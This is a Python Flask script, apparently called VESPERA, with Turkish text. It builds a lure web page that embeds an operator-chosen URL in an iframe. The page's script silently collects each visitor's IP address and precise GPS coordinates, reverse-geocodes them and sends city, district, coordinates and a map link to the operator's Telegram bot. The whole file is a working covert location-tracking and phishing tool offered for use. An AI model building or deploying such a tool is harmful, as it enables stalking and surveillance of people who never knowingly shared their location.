# -*- coding: utf-8 -*-
"""
VESPERA - Anlık Konum Takip Sistemi
Platform bağımsız, her cihazda çalışır
"""

from flask import Flask, render_template_string
import os
import platform
import subprocess
import sys
import time
import io

# Encoding ayarları - her cihazda çalışması için
if sys.platform == 'win32':
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# Colorama import - hata yakalama ile
try:
    import colorama
    from colorama import Fore, Style, init as colorama_init
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback renkler
    class Fore:
        GREEN = ''
        CYAN = ''
        YELLOW = ''
        RED = ''
        RESET = ''
    class Style:
        RESET_ALL = ''

# Banner modülü import
try:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'banner'))
    import banner
    BANNER_AVAILABLE = True
except (ImportError, Exception) as e:
    BANNER_AVAILABLE = False
    print(f"Banner modülü yüklenemedi: {e}")

def get_terminal_width():
    """Terminal genişliğini al - platform bağımsız"""
    try:
        if sys.platform == 'win32':
            try:
                from ctypes import windll, create_string_buffer
                h = windll.kernel32.GetStdHandle(-12)
                csbi = create_string_buffer(22)
                res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
                if res:
                    import struct
                    (bufx, bufy, curx, cury, wattr,
                     left, top, right, bottom,
                     maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
                    return right - left + 1
            except:
                pass
            return 80  # Varsayılan
        else:
            try:
                import fcntl
                import termios
                import struct
                h, w, hp, wp = struct.unpack(
                    'HHHH',
                    fcntl.ioctl(0, termios.TIOCGWINSZ, struct.pack('HHHH', 0, 0, 0, 0))
                )
                return w if w > 0 else 80
            except:
                return 80
    except:
        return 80

def clear_terminal():
    """Terminal temizleme - platform bağımsız"""
    try:
        if platform.system().lower() == "windows":
            os.system("cls")
        else:
            if "TERM" in os.environ:
                try:
                    subprocess.call("tput reset", shell=True)
                except:
                    os.system("clear")
            else:
                os.system("clear")
    except:
        pass  # Hata durumunda devam et

def safe_print(text, color='', end='\n'):
    """Güvenli yazdırma - encoding sorunlarını önler"""
    try:
        if COLORAMA_AVAILABLE:
            print(color + text + Fore.RESET, end=end)
        else:
            print(text, end=end)
    except UnicodeEncodeError:
        # Encoding hatası durumunda ASCII'ye çevir
        try:
            text = text.encode('ascii', 'ignore').decode('ascii')
            print(text, end=end)
        except:
            print("", end=end)
    except:
        print(text, end=end)

def typing_effect(text, color='', delay=0.03):
    """Yazı yazıyormuş gibi efekt - platform bağımsız"""
    try:
        for char in text:
            safe_print(char, color, end='')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    except:
        # Hata durumunda normal yazdır
        safe_print(text, color)

# Terminal temizle ve başlat
clear_terminal()

# Colorama başlat
if COLORAMA_AVAILABLE:
    try:
        colorama_init(autoreset=True, strip=False)
    except:
        pass

# Banner göster
if BANNER_AVAILABLE:
    try:
        banner.show_banner()
    except Exception as e:
        # Fallback banner
        safe_print("=" * 70, Fore.GREEN if COLORAMA_AVAILABLE else '')
        safe_print("VESPERA - Anlık Konum Takip Sistemi", Fore.CYAN if COLORAMA_AVAILABLE else '')
        safe_print("=" * 70, Fore.GREEN if COLORAMA_AVAILABLE else '')
        print()
else:
    # Basit banner
    safe_print("=" * 70, Fore.GREEN if COLORAMA_AVAILABLE else '')
    safe_print("VESPERA - Anlık Konum Takip Sistemi", Fore.CYAN if COLORAMA_AVAILABLE else '')
    safe_print("=" * 70, Fore.GREEN if COLORAMA_AVAILABLE else '')
    print()

# Başlatma mesajları
time.sleep(0.3)
if BANNER_AVAILABLE:
    try:
        banner.show_loading_message("VESPERA sistem modülleri yükleniyor...", 
                                   Fore.YELLOW if COLORAMA_AVAILABLE else '')
        time.sleep(0.2)
        banner.show_loading_message("Konum takip modülü hazırlanıyor...", 
                                   Fore.CYAN if COLORAMA_AVAILABLE else '')
        time.sleep(0.2)
        banner.show_loading_message("Telegram entegrasyonu kontrol ediliyor...", 
                                   Fore.CYAN if COLORAMA_AVAILABLE else '')
        time.sleep(0.2)
        banner.show_loading_message("Web sunucusu yapılandırılıyor...", 
                                   Fore.CYAN if COLORAMA_AVAILABLE else '')
    except:
        typing_effect("[*] Sistem modülleri yükleniyor...", 
                     Fore.YELLOW if COLORAMA_AVAILABLE else '', 0.02)
else:
    typing_effect("[*] Sistem modülleri yükleniyor...", 
                 Fore.YELLOW if COLORAMA_AVAILABLE else '', 0.02)

time.sleep(0.3)
print()

# Konfigürasyon başlığı
safe_print("╔" + "═" * 68 + "╗", Fore.GREEN if COLORAMA_AVAILABLE else '')
safe_print("║" + " " * 20 + "KONFIGÜRASYON GİRİŞİ" + " " * 27 + "║", 
          Fore.GREEN if COLORAMA_AVAILABLE else '')
safe_print("╚" + "═" * 68 + "╝", Fore.GREEN if COLORAMA_AVAILABLE else '')
print()

# Kullanıcı girişleri - encoding güvenli
try:
    safe_print("[?] Telegram Bot Tokeni: ", Fore.CYAN if COLORAMA_AVAILABLE else '')
    BOT_TOKEN = input().strip()
    
    safe_print("[?] Telegram Chat ID: ", Fore.CYAN if COLORAMA_AVAILABLE else '')
    CHAT_ID = input().strip()
    
    safe_print("[?] Yutturulucak URL: ", Fore.CYAN if COLORAMA_AVAILABLE else '')
    IFRAME_LINK = input().strip()
except (KeyboardInterrupt, EOFError):
    safe_print("\n[!] İşlem iptal edildi.", Fore.RED if COLORAMA_AVAILABLE else '')
    sys.exit(1)
except Exception as e:
    safe_print(f"\n[!] Hata: {e}", Fore.RED if COLORAMA_AVAILABLE else '')
    sys.exit(1)

print()

# Başarı mesajı
if BANNER_AVAILABLE:
    try:
        banner.show_success_message("Konfigürasyon başarıyla kaydedildi!", 
                                   Fore.GREEN if COLORAMA_AVAILABLE else '')
        time.sleep(0.2)
        banner.show_loading_message("Sistem başlatılıyor...", 
                                   Fore.YELLOW if COLORAMA_AVAILABLE else '')
    except:
        typing_effect("[+] Konfigürasyon kaydedildi!", 
                     Fore.GREEN if COLORAMA_AVAILABLE else '', 0.02)
else:
    typing_effect("[+] Konfigürasyon kaydedildi!", 
                 Fore.GREEN if COLORAMA_AVAILABLE else '', 0.02)

time.sleep(0.3)

# HTML Template
HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VESPERA - Konum Takip</title>
<style>
* {{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}}

body {{
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
    color: #e0e0e0;
    min-height: 100vh;
    padding: 20px;
    position: relative;
    overflow-x: hidden;
}}

body::before {{
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(circle at 20% 50%, rgba(0, 255, 136, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 80%, rgba(0, 200, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 20%, rgba(255, 0, 150, 0.1) 0%, transparent 50%);
    animation: pulse 10s ease-in-out infinite;
    z-index: -1;
}}

@keyframes pulse {{
    0%, 100% {{ opacity: 0.5; }}
    50% {{ opacity: 1; }}
}}

.container {{
    max-width: 1200px;
    margin: 0 auto;
    position: relative;
    z-index: 1;
}}

.header {{
    text-align: center;
    padding: 30px 20px;
    margin-bottom: 30px;
    background: rgba(0, 0, 0, 0.5);
    border-radius: 15px;
    border: 2px solid rgba(0, 255, 136, 0.3);
    box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
    backdrop-filter: blur(10px);
}}

.header h1 {{
    font-size: 3em;
    background: linear-gradient(135deg, #00ff88 0%, #00c8ff 50%, #ff0096 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 10px;
    text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
    animation: glow 2s ease-in-out infinite alternate;
}}

@keyframes glow {{
    from {{ filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5)); }}
    to {{ filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.8)); }}
}}

.header .subtitle {{
    color: #00c8ff;
    font-size: 1.2em;
    margin-top: 10px;
}}

.eye-symbol {{
    font-size: 3em;
    margin: 20px 0;
    animation: blink 3s infinite;
}}

@keyframes blink {{
    0%, 90%, 100% {{ opacity: 1; }}
    95% {{ opacity: 0.3; }}
}}

.content {{
    background: rgba(0, 0, 0, 0.6);
    border-radius: 15px;
    padding: 30px;
    margin-bottom: 20px;
    border: 1px solid rgba(0, 255, 136, 0.2);
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
}}

.content h2 {{
    color: #00ff88;
    margin-bottom: 20px;
    font-size: 1.8em;
    text-align: center;
}}

iframe {{
    width: 100%;
    height: 500px;
    border: 2px solid rgba(0, 255, 136, 0.3);
    border-radius: 10px;
    background: #000;
    box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
    transition: all 0.3s ease;
}}

iframe:hover {{
    border-color: rgba(0, 255, 136, 0.6);
    box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
}}

#footer {{
    margin-top: 30px;
    padding: 20px;
    background: rgba(0, 0, 0, 0.5);
    border-radius: 15px;
    text-align: center;
    font-size: 14px;
    color: #888;
    border: 1px solid rgba(0, 255, 136, 0.2);
}}

#footer a {{
    color: #00ff88;
    text-decoration: none;
    transition: all 0.3s ease;
    font-weight: bold;
}}

#footer a:hover {{
    color: #00c8ff;
    text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
}}

.status-indicator {{
    display: inline-block;
    width: 10px;
    height: 10px;
    background: #00ff88;
    border-radius: 50%;
    margin-right: 8px;
    animation: pulse-dot 2s infinite;
    box-shadow: 0 0 10px rgba(0, 255, 136, 0.8);
}}

@keyframes pulse-dot {{
    0%, 100% {{ opacity: 1; transform: scale(1); }}
    50% {{ opacity: 0.5; transform: scale(1.2); }}
}}

@media (max-width: 768px) {{
    .header h1 {{
        font-size: 2em;
    }}
    
    iframe {{
        height: 400px;
    }}
    
    .content {{
        padding: 20px;
    }}
}}
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="eye-symbol">👁️</div>
        <h1>VESPERA</h1>
        <div class="subtitle">Anlık Konum Takip Sistemi</div>
        <div style="margin-top: 15px;">
            <span class="status-indicator"></span>
            <span style="color: #00ff88;">Sistem Aktif</span>
        </div>
    </div>

    <div class="content">
        <h2>📍 Konum Takibi</h2>
        <iframe src="{IFRAME_LINK}" allowfullscreen></iframe>
    </div>

<div id="footer">
        <div style="margin-bottom: 10px;">
            <span class="status-indicator"></span>
            <strong style="color: #00ff88;">VESPERA</strong> - Gerçek Zamanlı Konum Takibi
        </div>
🔗 Telegram Kanalı: <a href="https://t.me/why_reronuzzz" target="_blank">@why_reronuzzz</a><br>
👨‍💻 Owner & Coded by RERO
    </div>
</div>

<script>
const BOT_TOKEN = "{BOT_TOKEN}";
const CHAT_ID = "{CHAT_ID}";

async function sendToTelegram(text){{
    try {{
    await fetch(
        `https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent(text)}}&parse_mode=Markdown`
    );
    }} catch(error) {{
        console.error("Telegram gönderim hatası:", error);
    }}
}}

async function getLocation(){{
    try {{
        let ip = "Bilinmiyor";

        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;

        if(navigator.geolocation){{
            navigator.geolocation.getCurrentPosition(async function(position){{
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                const res = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${{lat}}&lon=${{lon}}`
                );
                const data = await res.json();

                const city = data.address.city 
                          || data.address.town 
                          || data.address.village 
                          || "Bilinmiyor";

                const district = data.address.suburb 
                              || data.address.neighbourhood 
                              || "Bilinmiyor";

                const map_link = `https://www.google.com/maps?q=${{lat}},${{lon}}`;

                const msg = 
`👁️ *VESPERA - Konum Tespit Edildi*

📍 *Kullanıcının Konumu*

• *Şehir:* ${{city}}
• *Mahalle/Semt:* ${{district}}
• *Koordinatlar:* ${{lat}}, ${{lon}}
• *IP Adresi:* ${{ip}}
• *Harita:* [Haritada Aç](${{map_link}})

⚡ *VESPERA - Anlık Konum Takip Sistemi*
🔗 *Telegram Kanalı:* [@why_reronuzzz](https://t.me/why_reronuzzz)
👨‍💻 *Owner & Coded by RERO*`;

                await sendToTelegram(msg);

            }}, function(error){{
                console.error("Konum alınamadı veya izin verilmedi.", error);
            }}, {{
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }});
        }} 
        else {{
            console.error("Tarayıcınız konum almayı desteklemiyor.");
        }}
    }} catch(err) {{
        console.error("IP veya konum alınamadı:", err);
    }}
}}

getLocation();
</script>

</body>
</html>
"""

app = Flask(__name__)

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    print()
    safe_print("╔" + "═" * 68 + "╗", Fore.GREEN if COLORAMA_AVAILABLE else '')
    safe_print("║" + " " * 22 + "SİSTEM DURUMU" + " " * 32 + "║", 
              Fore.GREEN if COLORAMA_AVAILABLE else '')
    safe_print("╠" + "═" * 68 + "╣", Fore.GREEN if COLORAMA_AVAILABLE else '')
    
    if BANNER_AVAILABLE:
        try:
            banner.show_success_message("VESPERA sistemi başarıyla başlatıldı!", 
                                       Fore.GREEN if COLORAMA_AVAILABLE else '')
            banner.show_info_message("Web sunucusu aktif ve dinlemede...", 
                                    Fore.CYAN if COLORAMA_AVAILABLE else '')
            banner.show_info_message("Konum takip modülü hazır...", 
                                    Fore.CYAN if COLORAMA_AVAILABLE else '')
            banner.show_info_message("Telegram entegrasyonu aktif...", 
                                    Fore.CYAN if COLORAMA_AVAILABLE else '')
        except:
            typing_effect("[+] VESPERA sistemi başlatıldı!", 
                         Fore.GREEN if COLORAMA_AVAILABLE else '', 0.02)
    else:
        typing_effect("[+] VESPERA sistemi başlatıldı!", 
                     Fore.GREEN if COLORAMA_AVAILABLE else '', 0.02)
    
    print()
    safe_print("║  🔗 Tarayıcıda açmak için: " + 
              ("http://127.0.0.1:5000" if COLORAMA_AVAILABLE else "http://127.0.0.1:5000") + 
              "                        ║", Fore.GREEN if COLORAMA_AVAILABLE else '')
    safe_print("║  📍 Konum takibi otomatik olarak başlayacak..." + 
              "                    ║", Fore.GREEN if COLORAMA_AVAILABLE else '')
    safe_print("╚" + "═" * 68 + "╝", Fore.GREEN if COLORAMA_AVAILABLE else '')
    print()
    safe_print("vespera >_ | ", Fore.YELLOW if COLORAMA_AVAILABLE else '')
    print()
    
    try:
        app.run(debug=False, host='0.0.0.0', port=5000)
    except Exception as e:
        safe_print(f"[!] Sunucu başlatılamadı: {e}", 
                  Fore.RED if COLORAMA_AVAILABLE else '')
        sys.exit(1)
